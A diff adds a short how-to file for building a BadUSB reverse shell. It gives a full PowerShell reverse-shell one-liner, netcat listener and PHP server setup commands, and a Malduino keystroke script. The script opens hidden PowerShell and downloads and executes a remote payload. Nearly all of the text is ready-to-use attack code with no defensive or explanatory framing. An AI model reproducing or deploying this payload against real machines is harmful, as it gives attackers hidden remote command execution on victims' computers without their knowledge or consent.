@@ -1,0 +1,28 @@
+$ = commapd
+|| = text to paste
+
+**Create a reverseshell with a basusb**
+
+$ sudo apt install screen php netcat -y
+$ mkdir /tmp/web
+$ nano /tmp/web/rvs.ps1
+|| paste -> 
+--------- (change ip and port)
+$client = New-Object System.Net.Sockets.TCPClient('IP OF SERVER',PORT OF SERVER);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+---------
+$ screen -dmS nc bash -c 'while true; do nc -lvp 8888; done'
+$ screen -dmS php php -S 0.0.0.0:8080 -t /tmp/web
+
+(Open malduino interface)
+|| paste -> 
+---------
+LOCALE US
+DELAY 1000
+GUI r
+DELAY 100
+STRING powershell -windowstyle hidden -command "IEX (New-Object Net.WebClient).DownloadString('https://mywebserver:80/payload.ps1');"
+ENTER
+---------
+
+$ screen -r php
+$ screen -r nc
